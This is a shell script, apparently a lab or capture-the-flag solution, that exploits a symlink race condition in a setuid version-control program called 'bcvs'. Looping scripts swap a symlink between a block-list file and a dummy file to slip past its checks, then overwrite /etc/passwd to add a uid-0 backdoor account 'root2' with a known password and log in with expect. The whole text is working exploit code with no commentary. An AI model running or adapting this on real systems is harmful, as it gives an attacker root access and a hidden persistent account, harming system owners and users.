cd /opt/bcvs

echo "while true" > execute.sh
echo "do" >> execute.sh
echo "echo '' | ./bcvs ci backdoor" >> execute.sh
echo "echo '' | ./bcvs co backdoor" >> execute.sh
echo "done" >> execute.sh

echo "while true" > loop.sh
echo "do" >> loop.sh
echo "ln -sfn .bcvs/block.list backdoor" >> loop.sh
echo "ln -sfn unlock backdoor" >> loop.sh
echo "done" >> loop.sh

chmod u+x execute.sh
chmod u+x loop.sh

touch unlock

timeout 3s ./loop.sh &
timeout 3s ./execute.sh

ln -sfn /etc/passwd backdoor
echo "" | ./bcvs ci backdoor
echo "" | ./bcvs co backdoor

echo 'root2:yP8WgE3lDkCMQ:0:0:root:/root:/bin/bash' >> /etc/passwd

echo 'spawn su root2' > login.exp
echo 'expect "Password:"' >> login.exp
echo 'send "abc\r"' >> login.exp
echo 'interact' >> login.exp

expect login.exp
